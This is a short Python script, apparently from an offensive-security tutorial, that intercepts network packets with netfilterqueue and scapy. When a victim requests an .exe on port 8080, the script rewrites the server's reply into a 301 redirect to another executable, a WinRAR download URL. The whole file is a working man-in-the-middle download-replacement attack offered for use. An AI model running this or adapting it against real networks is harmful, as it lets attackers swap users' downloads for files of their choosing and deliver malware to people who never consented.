#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []

"""Function to modify packets load page 
   Also format strings such as len and chksum
   that check if the packet was changed"""


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    # Converting packet into scapy packet
    # get_payload() - to get more info from packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # Finding fields, deliver port
        if scapy_packet[scapy.TCP].dport == 8080:
            # Check if load contain file .exe
            if b".exe" in scapy_packet[scapy.Raw].load:
                print("[+] EXE Request")
                # Adding to list to adjust the right packet
                ack_list.append(scapy_packet[scapy.TCP].ack)
            # Send port
        elif scapy_packet[scapy.TCP].sport == 8080:
            if scapy_packet[scapy.TCP].seq in ack_list:
                # Clear list for future use
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
                                                         "https://www.rarlab.com/rar/winrar-x32-611.exe\n\n")
                # Convert scapy_packet to regular packet
                packet.set_payload(bytes(modified_packet))
    # Allow to pass packets through us
    packet.accept()


# Creating queue to store packets there
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
